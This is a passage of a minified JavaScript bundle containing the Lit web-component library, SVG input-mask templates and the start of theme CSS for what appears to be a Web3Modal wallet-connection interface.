 */const d9=globalThis,SR=d9.ShadowRoot&&(d9.ShadyCSS===void 0||d9.ShadyCSS.nativeShadow)&&"adoptedStyleSheets"in Document.prototype&&"replace"in CSSStyleSheet.prototype,AR=Symbol(),HF=new WeakMap;let see=class{constructor(e,t,i){if(this._$cssResult$=!0,i!==AR)throw Error("CSSResult is not constructable. Use `unsafeCSS` or `css` instead.");this.cssText=e,this.t=t}get styleSheet(){let e=this.o;const t=this.t;if(SR&&e===void 0){const i=t!==void 0&&t.length===1;i&&(e=HF.get(t)),e===void 0&&((this.o=e=new CSSStyleSheet).replaceSync(this.cssText),i&&HF.set(t,e))}return e}toString(){return this.cssText}};const Tn=r=>new see(typeof r=="string"?r:r+"",void 0,AR),ge=(r,...e)=>{const t=r.length===1?r[0]:e.reduce((i,n,s)=>i+(o=>{if(o._$cssResult$===!0)return o.cssText;if(typeof o=="number")return o;throw Error("Value passed to 'css' function must be a 'css' function result: "+o+". Use 'unsafeCSS' to pass non-literal values, but take care to ensure page security.")})(n)+r[s+1],r[0]);return new see(t,r,AR)},Uke=(r,e)=>{if(SR)r.adoptedStyleSheets=e.map(t=>t instanceof CSSStyleSheet?t:t.styleSheet);else for(const t of e){const i=document.createElement("style"),n=d9.litNonce;n!==void 0&&i.setAttribute("nonce",n),i.textContent=t.cssText,r.appendChild(i)}},VF=SR?r=>r:r=>r instanceof CSSStyleSheet?(e=>{let t="";for(const i of e.cssRules)t+=i.cssText;return Tn(t)})(r):r;/**
 * @license
 * Copyright 2017 Google LLC
 * SPDX-License-Identifier: BSD-3-Clause
 */const{is:jke,defineProperty:Fke,getOwnPropertyDescriptor:qke,getOwnPropertyNames:zke,getOwnPropertySymbols:Wke,getPrototypeOf:Hke}=Object,wC=globalThis,KF=wC.trustedTypes,Vke=KF?KF.emptyScript:"",Kke=wC.reactiveElementPolyfillSupport,T5=(r,e)=>r,h7={toAttribute(r,e){switch(e){case Boolean:r=r?Vke:null;break;case Object:case Array:r=r==null?r:JSON.stringify(r)}return r},fromAttribute(r,e){let t=r;switch(e){case Boolean:t=r!==null;break;case Number:t=r===null?null:Number(r);break;case Object:case Array:try{t=JSON.parse(r)}catch{t=null}}return t}},IR=(r,e)=>!jke(r,e),GF={attribute:!0,type:String,converter:h7,reflect:!1,useDefault:!1,hasChanged:IR};Symbol.metadata??=Symbol("metadata"),wC.litPropertyMetadata??=new WeakMap;let Lm=class extends HTMLElement{static addInitializer(e){this._$Ei(),(this.l??=[]).push(e)}static get observedAttributes(){return this.finalize(),this._$Eh&&[...this._$Eh.keys()]}static createProperty(e,t=GF){if(t.state&&(t.attribute=!1),this._$Ei(),this.prototype.hasOwnProperty(e)&&((t=Object.create(t)).wrapped=!0),this.elementProperties.set(e,t),!t.noAccessor){const i=Symbol(),n=this.getPropertyDescriptor(e,i,t);n!==void 0&&Fke(this.prototype,e,n)}}static getPropertyDescriptor(e,t,i){const{get:n,set:s}=qke(this.prototype,e)??{get(){return this[t]},set(o){this[t]=o}};return{get:n,set(o){const a=n?.call(this);s?.call(this,o),this.requestUpdate(e,a,i)},configurable:!0,enumerable:!0}}static getPropertyOptions(e){return this.elementProperties.get(e)??GF}static _$Ei(){if(this.hasOwnProperty(T5("elementProperties")))return;const e=Hke(this);e.finalize(),e.l!==void 0&&(this.l=[...e.l]),this.elementProperties=new Map(e.elementProperties)}static finalize(){if(this.hasOwnProperty(T5("finalized")))return;if(this.finalized=!0,this._$Ei(),this.hasOwnProperty(T5("properties"))){const t=this.properties,i=[...zke(t),...Wke(t)];for(const n of i)this.createProperty(n,t[n])}const e=this[Symbol.metadata];if(e!==null){const t=litPropertyMetadata.get(e);if(t!==void 0)for(const[i,n]of t)this.elementProperties.set(i,n)}this._$Eh=new Map;for(const[t,i]of this.elementProperties){const n=this._$Eu(t,i);n!==void 0&&this._$Eh.set(n,t)}this.elementStyles=this.finalizeStyles(this.styles)}static finalizeStyles(e){const t=[];if(Array.isArray(e)){const i=new Set(e.flat(1/0).reverse());for(const n of i)t.unshift(VF(n))}else e!==void 0&&t.push(VF(e));return t}static _$Eu(e,t){const i=t.attribute;return i===!1?void 0:typeof i=="string"?i:typeof e=="string"?e.toLowerCase():void 0}constructor(){super(),this._$Ep=void 0,this.isUpdatePending=!1,this.hasUpdated=!1,this._$Em=null,this._$Ev()}_$Ev(){this._$ES=new Promise(e=>this.enableUpdating=e),this._$AL=new Map,this._$E_(),this.requestUpdate(),this.constructor.l?.forEach(e=>e(this))}addController(e){(this._$EO??=new Set).add(e),this.renderRoot!==void 0&&this.isConnected&&e.hostConnected?.()}removeController(e){this._$EO?.delete(e)}_$E_(){const e=new Map,t=this.constructor.elementProperties;for(const i of t.keys())this.hasOwnProperty(i)&&(e.set(i,this[i]),delete this[i]);e.size>0&&(this._$Ep=e)}createRenderRoot(){const e=this.shadowRoot??this.attachShadow(this.constructor.shadowRootOptions);return Uke(e,this.constructor.elementStyles),e}connectedCallback(){this.renderRoot??=this.createRenderRoot(),this.enableUpdating(!0),this._$EO?.forEach(e=>e.hostConnected?.())}enableUpdating(e){}disconnectedCallback(){this._$EO?.forEach(e=>e.hostDisconnected?.())}attributeChangedCallback(e,t,i){this._$AK(e,i)}_$ET(e,t){const i=this.constructor.elementProperties.get(e),n=this.constructor._$Eu(e,i);if(n!==void 0&&i.reflect===!0){const s=(i.converter?.toAttribute!==void 0?i.converter:h7).toAttribute(t,i.type);this._$Em=e,s==null?this.removeAttribute(n):this.setAttribute(n,s),this._$Em=null}}_$AK(e,t){const i=this.constructor,n=i._$Eh.get(e);if(n!==void 0&&this._$Em!==n){const s=i.getPropertyOptions(n),o=typeof s.converter=="function"?{fromAttribute:s.converter}:s.converter?.fromAttribute!==void 0?s.converter:h7;this._$Em=n;const a=o.fromAttribute(t,s.type);this[n]=a??this._$Ej?.get(n)??a,this._$Em=null}}requestUpdate(e,t,i){if(e!==void 0){const n=this.constructor,s=this[e];if(i??=n.getPropertyOptions(e),!((i.hasChanged??IR)(s,t)||i.useDefault&&i.reflect&&s===this._$Ej?.get(e)&&!this.hasAttribute(n._$Eu(e,i))))return;this.C(e,t,i)}this.isUpdatePending===!1&&(this._$ES=this._$EP())}C(e,t,{useDefault:i,reflect:n,wrapped:s},o){i&&!(this._$Ej??=new Map).has(e)&&(this._$Ej.set(e,o??t??this[e]),s!==!0||o!==void 0)||(this._$AL.has(e)||(this.hasUpdated||i||(t=void 0),this._$AL.set(e,t)),n===!0&&this._$Em!==e&&(this._$Eq??=new Set).add(e))}async _$EP(){this.isUpdatePending=!0;try{await this._$ES}catch(t){Promise.reject(t)}const e=this.scheduleUpdate();return e!=null&&await e,!this.isUpdatePending}scheduleUpdate(){return this.performUpdate()}performUpdate(){if(!this.isUpdatePending)return;if(!this.hasUpdated){if(this.renderRoot??=this.createRenderRoot(),this._$Ep){for(const[n,s]of this._$Ep)this[n]=s;this._$Ep=void 0}const i=this.constructor.elementProperties;if(i.size>0)for(const[n,s]of i){const{wrapped:o}=s,a=this[n];o!==!0||this._$AL.has(n)||a===void 0||this.C(n,void 0,s,a)}}let e=!1;const t=this._$AL;try{e=this.shouldUpdate(t),e?(this.willUpdate(t),this._$EO?.forEach(i=>i.hostUpdate?.()),this.update(t)):this._$EM()}catch(i){throw e=!1,this._$EM(),i}e&&this._$AE(t)}willUpdate(e){}_$AE(e){this._$EO?.forEach(t=>t.hostUpdated?.()),this.hasUpdated||(this.hasUpdated=!0,this.firstUpdated(e)),this.updated(e)}_$EM(){this._$AL=new Map,this.isUpdatePending=!1}get updateComplete(){return this.getUpdateComplete()}getUpdateComplete(){return this._$ES}shouldUpdate(e){return!0}update(e){this._$Eq&&=this._$Eq.forEach(t=>this._$ET(t,this[t])),this._$EM()}updated(e){}firstUpdated(e){}};Lm.elementStyles=[],Lm.shadowRootOptions={mode:"open"},Lm[T5("elementProperties")]=new Map,Lm[T5("finalized")]=new Map,Kke?.({ReactiveElement:Lm}),(wC.reactiveElementVersions??=[]).push("2.1.1");/**
 * @license
 * Copyright 2017 Google LLC
 * SPDX-License-Identifier: BSD-3-Clause
 */const TR=globalThis,f7=TR.trustedTypes,ZF=f7?f7.createPolicy("lit-html",{createHTML:r=>r}):void 0,oee="$lit$",If=`lit$${Math.random().toFixed(9).slice(2)}$`,aee="?"+If,Gke=`<${aee}>`,X1=document,Gv=()=>X1.createComment(""),Zv=r=>r===null||typeof r!="object"&&typeof r!="function",kR=Array.isArray,Zke=r=>kR(r)||typeof r?.[Symbol.iterator]=="function",oA=`[ 	
\f\r]`,Ab=/<(?:(!--|\/[^a-zA-Z])|(\/?[a-zA-Z][^>\s]*)|(\/?$))/g,YF=/-->/g,JF=/>/g,Vp=RegExp(`>|${oA}(?:([^\\s"'>=/]+)(${oA}*=${oA}*(?:[^ 	
\f\r"'\`<>=]|("|')|))|$)`,"g"),QF=/'/g,XF=/"/g,cee=/^(?:script|style|textarea|title)$/i,lee=r=>(e,...t)=>({_$litType$:r,strings:e,values:t}),F=lee(1),xe=lee(2),h0=Symbol.for("lit-noChange"),Qn=Symbol.for("lit-nothing"),eq=new WeakMap,x1=X1.createTreeWalker(X1,129);function uee(r,e){if(!kR(r)||!r.hasOwnProperty("raw"))throw Error("invalid template strings array");return ZF!==void 0?ZF.createHTML(e):e}const Yke=(r,e)=>{const t=r.length-1,i=[];let n,s=e===2?"<svg>":e===3?"<math>":"",o=Ab;for(let a=0;a<t;a++){const c=r[a];let l,u,d=-1,h=0;for(;h<c.length&&(o.lastIndex=h,u=o.exec(c),u!==null);)h=o.lastIndex,o===Ab?u[1]==="!--"?o=YF:u[1]!==void 0?o=JF:u[2]!==void 0?(cee.test(u[2])&&(n=RegExp("</"+u[2],"g")),o=Vp):u[3]!==void 0&&(o=Vp):o===Vp?u[0]===">"?(o=n??Ab,d=-1):u[1]===void 0?d=-2:(d=o.lastIndex-u[2].length,l=u[1],o=u[3]===void 0?Vp:u[3]==='"'?XF:QF):o===XF||o===QF?o=Vp:o===YF||o===JF?o=Ab:(o=Vp,n=void 0);const f=o===Vp&&r[a+1].startsWith("/>")?" ":"";s+=o===Ab?c+Gke:d>=0?(i.push(l),c.slice(0,d)+oee+c.slice(d)+If+f):c+If+(d===-2?a:f)}return[uee(r,s+(r[t]||"<?>")+(e===2?"</svg>":e===3?"</math>":"")),i]};let jk=class dee{constructor({strings:e,_$litType$:t},i){let n;this.parts=[];let s=0,o=0;const a=e.length-1,c=this.parts,[l,u]=Yke(e,t);if(this.el=dee.createElement(l,i),x1.currentNode=this.el.content,t===2||t===3){const d=this.el.content.firstChild;d.replaceWith(...d.childNodes)}for(;(n=x1.nextNode())!==null&&c.length<a;){if(n.nodeType===1){if(n.hasAttributes())for(const d of n.getAttributeNames())if(d.endsWith(oee)){const h=u[o++],f=n.getAttribute(d).split(If),p=/([.?@])?(.*)/.exec(h);c.push({type:1,index:s,name:p[2],strings:f,ctor:p[1]==="."?Qke:p[1]==="?"?Xke:p[1]==="@"?eNe:bC}),n.removeAttribute(d)}else d.startsWith(If)&&(c.push({type:6,index:s}),n.removeAttribute(d));if(cee.test(n.tagName)){const d=n.textContent.split(If),h=d.length-1;if(h>0){n.textContent=f7?f7.emptyScript:"";for(let f=0;f<h;f++)n.append(d[f],Gv()),x1.nextNode(),c.push({type:2,index:++s});n.append(d[h],Gv())}}}else if(n.nodeType===8)if(n.data===aee)c.push({type:2,index:s});else{let d=-1;for(;(d=n.data.indexOf(If,d+1))!==-1;)c.push({type:7,index:s}),d+=If.length-1}s++}}static createElement(e,t){const i=X1.createElement("template");return i.innerHTML=e,i}};function $w(r,e,t=r,i){if(e===h0)return e;let n=i!==void 0?t._$Co?.[i]:t._$Cl;const s=Zv(e)?void 0:e._$litDirective$;return n?.constructor!==s&&(n?._$AO?.(!1),s===void 0?n=void 0:(n=new s(r),n._$AT(r,t,i)),i!==void 0?(t._$Co??=[])[i]=n:t._$Cl=n),n!==void 0&&(e=$w(r,n._$AS(r,e.values),n,i)),e}let Jke=class{constructor(e,t){this._$AV=[],this._$AN=void 0,this._$AD=e,this._$AM=t}get parentNode(){return this._$AM.parentNode}get _$AU(){return this._$AM._$AU}u(e){const{el:{content:t},parts:i}=this._$AD,n=(e?.creationScope??X1).importNode(t,!0);x1.currentNode=n;let s=x1.nextNode(),o=0,a=0,c=i[0];for(;c!==void 0;){if(o===c.index){let l;c.type===2?l=new NR(s,s.nextSibling,this,e):c.type===1?l=new c.ctor(s,c.name,c.strings,this,e):c.type===6&&(l=new tNe(s,this,e)),this._$AV.push(l),c=i[++a]}o!==c?.index&&(s=x1.nextNode(),o++)}return x1.currentNode=X1,n}p(e){let t=0;for(const i of this._$AV)i!==void 0&&(i.strings!==void 0?(i._$AI(e,i,t),t+=i.strings.length-2):i._$AI(e[t])),t++}},NR=class hee{get _$AU(){return this._$AM?._$AU??this._$Cv}constructor(e,t,i,n){this.type=2,this._$AH=Qn,this._$AN=void 0,this._$AA=e,this._$AB=t,this._$AM=i,this.options=n,this._$Cv=n?.isConnected??!0}get parentNode(){let e=this._$AA.parentNode;const t=this._$AM;return t!==void 0&&e?.nodeType===11&&(e=t.parentNode),e}get startNode(){return this._$AA}get endNode(){return this._$AB}_$AI(e,t=this){e=$w(this,e,t),Zv(e)?e===Qn||e==null||e===""?(this._$AH!==Qn&&this._$AR(),this._$AH=Qn):e!==this._$AH&&e!==h0&&this._(e):e._$litType$!==void 0?this.$(e):e.nodeType!==void 0?this.T(e):Zke(e)?this.k(e):this._(e)}O(e){return this._$AA.parentNode.insertBefore(e,this._$AB)}T(e){this._$AH!==e&&(this._$AR(),this._$AH=this.O(e))}_(e){this._$AH!==Qn&&Zv(this._$AH)?this._$AA.nextSibling.data=e:this.T(X1.createTextNode(e)),this._$AH=e}$(e){const{values:t,_$litType$:i}=e,n=typeof i=="number"?this._$AC(e):(i.el===void 0&&(i.el=jk.createElement(uee(i.h,i.h[0]),this.options)),i);if(this._$AH?._$AD===n)this._$AH.p(t);else{const s=new Jke(n,this),o=s.u(this.options);s.p(t),this.T(o),this._$AH=s}}_$AC(e){let t=eq.get(e.strings);return t===void 0&&eq.set(e.strings,t=new jk(e)),t}k(e){kR(this._$AH)||(this._$AH=[],this._$AR());const t=this._$AH;let i,n=0;for(const s of e)n===t.length?t.push(i=new hee(this.O(Gv()),this.O(Gv()),this,this.options)):i=t[n],i._$AI(s),n++;n<t.length&&(this._$AR(i&&i._$AB.nextSibling,n),t.length=n)}_$AR(e=this._$AA.nextSibling,t){for(this._$AP?.(!1,!0,t);e!==this._$AB;){const i=e.nextSibling;e.remove(),e=i}}setConnected(e){this._$AM===void 0&&(this._$Cv=e,this._$AP?.(e))}},bC=class{get tagName(){return this.element.tagName}get _$AU(){return this._$AM._$AU}constructor(e,t,i,n,s){this.type=1,this._$AH=Qn,this._$AN=void 0,this.element=e,this.name=t,this._$AM=n,this.options=s,i.length>2||i[0]!==""||i[1]!==""?(this._$AH=Array(i.length-1).fill(new String),this.strings=i):this._$AH=Qn}_$AI(e,t=this,i,n){const s=this.strings;let o=!1;if(s===void 0)e=$w(this,e,t,0),o=!Zv(e)||e!==this._$AH&&e!==h0,o&&(this._$AH=e);else{const a=e;let c,l;for(e=s[0],c=0;c<s.length-1;c++)l=$w(this,a[i+c],t,c),l===h0&&(l=this._$AH[c]),o||=!Zv(l)||l!==this._$AH[c],l===Qn?e=Qn:e!==Qn&&(e+=(l??"")+s[c+1]),this._$AH[c]=l}o&&!n&&this.j(e)}j(e){e===Qn?this.element.removeAttribute(this.name):this.element.setAttribute(this.name,e??"")}},Qke=class extends bC{constructor(){super(...arguments),this.type=3}j(e){this.element[this.name]=e===Qn?void 0:e}},Xke=class extends bC{constructor(){super(...arguments),this.type=4}j(e){this.element.toggleAttribute(this.name,!!e&&e!==Qn)}},eNe=class extends bC{constructor(e,t,i,n,s){super(e,t,i,n,s),this.type=5}_$AI(e,t=this){if((e=$w(this,e,t,0)??Qn)===h0)return;const i=this._$AH,n=e===Qn&&i!==Qn||e.capture!==i.capture||e.once!==i.once||e.passive!==i.passive,s=e!==Qn&&(i===Qn||n);n&&this.element.removeEventListener(this.name,this,i),s&&this.element.addEventListener(this.name,this,e),this._$AH=e}handleEvent(e){typeof this._$AH=="function"?this._$AH.call(this.options?.host??this.element,e):this._$AH.handleEvent(e)}},tNe=class{constructor(e,t,i){this.element=e,this.type=6,this._$AN=void 0,this._$AM=t,this.options=i}get _$AU(){return this._$AM._$AU}_$AI(e){$w(this,e)}};const rNe=TR.litHtmlPolyfillSupport;rNe?.(jk,NR),(TR.litHtmlVersions??=[]).push("3.3.1");const iNe=(r,e,t)=>{const i=t?.renderBefore??e;let n=i._$litPart$;if(n===void 0){const s=t?.renderBefore??null;i._$litPart$=n=new NR(e.insertBefore(Gv(),s),s,void 0,t??{})}return n._$AI(r),n};/**
 * @license
 * Copyright 2017 Google LLC
 * SPDX-License-Identifier: BSD-3-Clause
 */const PR=globalThis;let he=class extends Lm{constructor(){super(...arguments),this.renderOptions={host:this},this._$Do=void 0}createRenderRoot(){const e=super.createRenderRoot();return this.renderOptions.renderBefore??=e.firstChild,e}update(e){const t=this.render();this.hasUpdated||(this.renderOptions.isConnected=this.isConnected),super.update(e),this._$Do=iNe(t,this.renderRoot,this.renderOptions)}connectedCallback(){super.connectedCallback(),this._$Do?.setConnected(!0)}disconnectedCallback(){super.disconnectedCallback(),this._$Do?.setConnected(!1)}render(){return h0}};he._$litElement$=!0,he.finalized=!0,PR.litElementHydrateSupport?.({LitElement:he});const nNe=PR.litElementPolyfillSupport;nNe?.({LitElement:he});(PR.litElementVersions??=[]).push("4.2.1");const sNe=xe`<svg class="input_mask" width="328" height="100" viewBox="0 0 328 100" fill="none">
  <mask id="path-1-inside-1_18299_4189">
    <path
      class="input_mask__border"
      fill-rule="evenodd"
      clip-rule="evenodd"
      d="M138.008 0H40C21.1438 0 11.7157 0 5.85786 5.85786C0 11.7157 0 21.1438 0 40V60C0 78.8562 0 88.2843 5.85786 94.1421C11.7157 100 21.1438 100 40 100H288C306.856 100 316.284 100 322.142 94.1421C328 88.2843 328 78.8562 328 60V40C328 21.1438 328 11.7157 322.142 5.85786C316.284 0 306.856 0 288 0H189.992C189.958 4.89122 189.786 7.76279 188.914 10.1564C187.095 15.1562 183.156 19.0947 178.156 20.9145C175.174 22 171.449 22 164 22C156.551 22 152.826 22 149.844 20.9145C144.844 19.0947 140.905 15.1562 139.086 10.1564C138.214 7.76279 138.042 4.89122 138.008 0Z"
    />
  </mask>
  <path
    class="input_mask__background"
    fill-rule="evenodd"
    clip-rule="evenodd"
    d="M138.008 0H40C21.1438 0 11.7157 0 5.85786 5.85786C0 11.7157 0 21.1438 0 40V60C0 78.8562 0 88.2843 5.85786 94.1421C11.7157 100 21.1438 100 40 100H288C306.856 100 316.284 100 322.142 94.1421C328 88.2843 328 78.8562 328 60V40C328 21.1438 328 11.7157 322.142 5.85786C316.284 0 306.856 0 288 0H189.992C189.958 4.89122 189.786 7.76279 188.914 10.1564C187.095 15.1562 183.156 19.0947 178.156 20.9145C175.174 22 171.449 22 164 22C156.551 22 152.826 22 149.844 20.9145C144.844 19.0947 140.905 15.1562 139.086 10.1564C138.214 7.76279 138.042 4.89122 138.008 0Z"
  />
  <path
    class="input_mask__border"
    d="M138.008 0L139.008 -0.00694413L139.001 -1H138.008V0ZM322.142 94.1421L322.849 94.8492H322.849L322.142 94.1421ZM322.142 5.85786L322.849 5.15076L322.849 5.15076L322.142 5.85786ZM189.992 0V-1H188.999L188.992 -0.00694413L189.992 0ZM188.914 10.1564L189.854 10.4984V10.4984L188.914 10.1564ZM178.156 20.9145L177.814 19.9748V19.9748L178.156 20.9145ZM149.844 20.9145L150.186 19.9748V19.9748L149.844 20.9145ZM139.086 10.1564L138.146 10.4984V10.4984L139.086 10.1564ZM40 1H138.008V-1H40V1ZM6.56497 6.56497C9.27713 3.85281 12.8524 2.44064 18.1878 1.72332C23.552 1.00212 30.5436 1 40 1V-1C30.6002 -1 23.4497 -1.00212 17.9213 -0.25885C12.3641 0.488292 8.29646 2.00506 5.15076 5.15076L6.56497 6.56497ZM1 40C1 30.5436 1.00212 23.552 1.72332 18.1878C2.44064 12.8524 3.85281 9.27713 6.56497 6.56497L5.15076 5.15076C2.00506 8.29646 0.488292 12.3641 -0.25885 17.9213C-1.00212 23.4497 -1 30.6002 -1 40H1ZM1 60V40H-1V60H1ZM6.56497 93.435C3.85281 90.7229 2.44064 87.1476 1.72332 81.8122C1.00212 76.448 1 69.4564 1 60H-1C-1 69.3998 -1.00212 76.5503 -0.25885 82.0787C0.488292 87.6358 2.00506 91.7035 5.15076 94.8492L6.56497 93.435ZM40 99C30.5436 99 23.552 98.9979 18.1878 98.2767C12.8524 97.5594 9.27713 96.1472 6.56497 93.435L5.15076 94.8492C8.29646 97.9949 12.3641 99.5117 17.9213 100.259C23.4497 101.002 30.6002 101 40 101V99ZM288 99H40V101H288V99ZM321.435 93.435C318.723 96.1472 315.148 97.5594 309.812 98.2767C304.448 98.9979 297.456 99 288 99V101C297.4 101 304.55 101.002 310.079 100.259C315.636 99.5117 319.704 97.9949 322.849 94.8492L321.435 93.435ZM327 60C327 69.4564 326.998 76.448 326.277 81.8122C325.559 87.1476 324.147 90.7229 321.435 93.435L322.849 94.8492C325.995 91.7035 327.512 87.6358 328.259 82.0787C329.002 76.5503 329 69.3998 329 60H327ZM327 40V60H329V40H327ZM321.435 6.56497C324.147 9.27713 325.559 12.8524 326.277 18.1878C326.998 23.552 327 30.5436 327 40H329C329 30.6002 329.002 23.4497 328.259 17.9213C327.512 12.3642 325.995 8.29646 322.849 5.15076L321.435 6.56497ZM288 1C297.456 1 304.448 1.00212 309.812 1.72332C315.148 2.44064 318.723 3.85281 321.435 6.56497L322.849 5.15076C319.704 2.00506 315.636 0.488292 310.079 -0.25885C304.55 -1.00212 297.4 -1 288 -1V1ZM189.992 1H288V-1H189.992V1ZM188.992 -0.00694413C188.958 4.90792 188.778 7.60788 187.975 9.81434L189.854 10.4984C190.793 7.9177 190.958 4.87452 190.992 0.00694413L188.992 -0.00694413ZM187.975 9.81434C186.256 14.5364 182.536 18.2561 177.814 19.9748L178.498 21.8542C183.776 19.9333 187.933 15.7759 189.854 10.4984L187.975 9.81434ZM177.814 19.9748C175.039 20.9848 171.536 21 164 21V23C171.362 23 175.308 23.0152 178.498 21.8542L177.814 19.9748ZM164 21C156.464 21 152.961 20.9848 150.186 19.9748L149.502 21.8542C152.692 23.0152 156.638 23 164 23V21ZM150.186 19.9748C145.464 18.2561 141.744 14.5364 140.025 9.81434L138.146 10.4984C140.067 15.7759 144.224 19.9333 149.502 21.8542L150.186 19.9748ZM140.025 9.81434C139.222 7.60788 139.042 4.90792 139.008 -0.00694413L137.008 0.00694413C137.042 4.87452 137.207 7.9177 138.146 10.4984L140.025 9.81434Z"
    mask="url(#path-1-inside-1_18299_4189)"
  />
</svg>`,oNe=xe`<svg class="input_mask" width="328" height="100" viewBox="0 0 328 100" fill="none">
  <mask id="path-1-inside-1_18299_4168">
    <path
      class="input_mask__border"
      fill-rule="evenodd"
      clip-rule="evenodd"
      d="M5.85786 5.85786C0 11.7157 0 21.1438 0 40V60C0 78.8562 0 88.2843 5.85786 94.1421C11.7157 100 21.1438 100 40 100H138.008C138.042 95.1088 138.214 92.2372 139.086 89.8436C140.905 84.8438 144.844 80.9053 149.844 79.0855C152.826 78 156.551 78 164 78C171.449 78 175.174 78 178.156 79.0855C183.156 80.9053 187.095 84.8438 188.914 89.8436C189.786 92.2372 189.958 95.1088 189.992 100H288C306.856 100 316.284 100 322.142 94.1421C328 88.2843 328 78.8562 328 60V40C328 21.1438 328 11.7157 322.142 5.85786C316.284 0 306.856 0 288 0H40C21.1438 0 11.7157 0 5.85786 5.85786Z"
    />
  </mask>
  <path
    class="input_mask__background"
    fill-rule="evenodd"
    clip-rule="evenodd"
    d="M5.85786 5.85786C0 11.7157 0 21.1438 0 40V60C0 78.8562 0 88.2843 5.85786 94.1421C11.7157 100 21.1438 100 40 100H138.008C138.042 95.1088 138.214 92.2372 139.086 89.8436C140.905 84.8438 144.844 80.9053 149.844 79.0855C152.826 78 156.551 78 164 78C171.449 78 175.174 78 178.156 79.0855C183.156 80.9053 187.095 84.8438 188.914 89.8436C189.786 92.2372 189.958 95.1088 189.992 100H288C306.856 100 316.284 100 322.142 94.1421C328 88.2843 328 78.8562 328 60V40C328 21.1438 328 11.7157 322.142 5.85786C316.284 0 306.856 0 288 0H40C21.1438 0 11.7157 0 5.85786 5.85786Z"
  />
  <path
    class="input_mask__border"
    d="M138.008 100V101H139.001L139.008 100.007L138.008 100ZM139.086 89.8436L138.146 89.5016L139.086 89.8436ZM149.844 79.0855L150.186 80.0252L149.844 79.0855ZM178.156 79.0855L177.814 80.0252L178.156 79.0855ZM188.914 89.8436L189.854 89.5016L188.914 89.8436ZM189.992 100L188.992 100.007L188.999 101H189.992V100ZM322.142 94.1421L322.849 94.8492H322.849L322.142 94.1421ZM322.142 5.85786L322.849 5.15076L322.849 5.15076L322.142 5.85786ZM1 40C1 30.5436 1.00212 23.552 1.72332 18.1878C2.44064 12.8524 3.85281 9.27713 6.56497 6.56497L5.15076 5.15076C2.00506 8.29646 0.488292 12.3641 -0.25885 17.9213C-1.00212 23.4497 -1 30.6002 -1 40H1ZM1 60V40H-1V60H1ZM6.56497 93.435C3.85281 90.7229 2.44064 87.1476 1.72332 81.8122C1.00212 76.448 1 69.4564 1 60H-1C-1 69.3998 -1.00212 76.5503 -0.25885 82.0787C0.488292 87.6358 2.00506 91.7035 5.15076 94.8492L6.56497 93.435ZM40 99C30.5436 99 23.552 98.9979 18.1878 98.2767C12.8524 97.5594 9.27713 96.1472 6.56497 93.435L5.15076 94.8492C8.29646 97.9949 12.3641 99.5117 17.9213 100.259C23.4497 101.002 30.6002 101 40 101V99ZM138.008 99H40V101H138.008V99ZM139.008 100.007C139.042 95.0921 139.222 92.3921 140.025 90.1857L138.146 89.5016C137.207 92.0823 137.042 95.1255 137.008 99.9931L139.008 100.007ZM140.025 90.1857C141.744 85.4636 145.464 81.7439 150.186 80.0252L149.502 78.1458C144.224 80.0667 140.067 84.2241 138.146 89.5016L140.025 90.1857ZM150.186 80.0252C152.961 79.0152 156.464 79 164 79V77C156.638 77 152.692 76.9848 149.502 78.1458L150.186 80.0252ZM164 79C171.536 79 175.039 79.0152 177.814 80.0252L178.498 78.1458C175.308 76.9848 171.362 77 164 77V79ZM177.814 80.0252C182.536 81.7439 186.256 85.4636 187.975 90.1857L189.854 89.5016C187.933 84.2241 183.776 80.0667 178.498 78.1458L177.814 80.0252ZM187.975 90.1857C188.778 92.3921 188.958 95.0921 188.992 100.007L190.992 99.9931C190.958 95.1255 190.793 92.0823 189.854 89.5016L187.975 90.1857ZM288 99H189.992V101H288V99ZM321.435 93.435C318.723 96.1472 315.148 97.5594 309.812 98.2767C304.448 98.9979 297.456 99 288 99V101C297.4 101 304.55 101.002 310.079 100.259C315.636 99.5117 319.704 97.9949 322.849 94.8492L321.435 93.435ZM327 60C327 69.4564 326.998 76.448 326.277 81.8122C325.559 87.1476 324.147 90.7229 321.435 93.435L322.849 94.8492C325.995 91.7035 327.512 87.6358 328.259 82.0787C329.002 76.5503 329 69.3998 329 60H327ZM327 40V60H329V40H327ZM321.435 6.56497C324.147 9.27713 325.559 12.8524 326.277 18.1878C326.998 23.552 327 30.5436 327 40H329C329 30.6002 329.002 23.4497 328.259 17.9213C327.512 12.3642 325.995 8.29646 322.849 5.15076L321.435 6.56497ZM288 1C297.456 1 304.448 1.00212 309.812 1.72332C315.148 2.44064 318.723 3.85281 321.435 6.56497L322.849 5.15076C319.704 2.00506 315.636 0.488292 310.079 -0.25885C304.55 -1.00212 297.4 -1 288 -1V1ZM40 1H288V-1H40V1ZM6.56497 6.56497C9.27713 3.85281 12.8524 2.44064 18.1878 1.72332C23.552 1.00212 30.5436 1 40 1V-1C30.6002 -1 23.4497 -1.00212 17.9213 -0.25885C12.3641 0.488292 8.29646 2.00506 5.15076 5.15076L6.56497 6.56497Z"
    mask="url(#path-1-inside-1_18299_4168)"
  />
</svg>`;let k5,Wf,Hf;function fee(r,e){k5=document.createElement("style"),Wf=document.createElement("style"),Hf=document.createElement("style"),k5.textContent=sw(r).core.cssText,Wf.textContent=sw(r).dark.cssText,Hf.textContent=sw(r).light.cssText,document.head.appendChild(k5),document.head.appendChild(Wf),document.head.appendChild(Hf),$R(e)}function $R(r){Wf&&Hf&&(r==="light"?(Wf.removeAttribute("media"),Hf.media="enabled"):(Hf.removeAttribute("media"),Wf.media="enabled"))}function pee(r){k5&&Wf&&Hf&&(k5.textContent=sw(r).core.cssText,Wf.textContent=sw(r).dark.cssText,Hf.textContent=sw(r).light.cssText)}function sw(r){return{core:ge`
      @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
      @keyframes w3m-shake {
        0% {
          transform: scale(1) rotate(0deg);
        }
        20% {
          transform: scale(1) rotate(-1deg);
        }
        40% {
          transform: scale(1) rotate(1.5deg);
        }
        60% {
          transform: scale(1) rotate(-1.5deg);
        }
        80% {
          transform: scale(1) rotate(1deg);
        }
        100% {
          transform: scale(1) rotate(0deg);
        }
      }
      @keyframes w3m-iframe-fade-out {
        0% {
          opacity: 1;
        }
        100% {
          opacity: 0;
        }
      }
      @keyframes w3m-iframe-zoom-in {
        0% {
          transform: translateY(50px);
          opacity: 0;
        }
        100% {
          transform: translateY(0px);
          opacity: 1;
        }
      }
      @keyframes w3m-iframe-zoom-in-mobile {
        0% {
          transform: scale(0.95);
          opacity: 0;
        }
        100% {
          transform: scale(1);
          opacity: 1;
        }
      }
      :root {
        --w3m-modal-width: 360px;
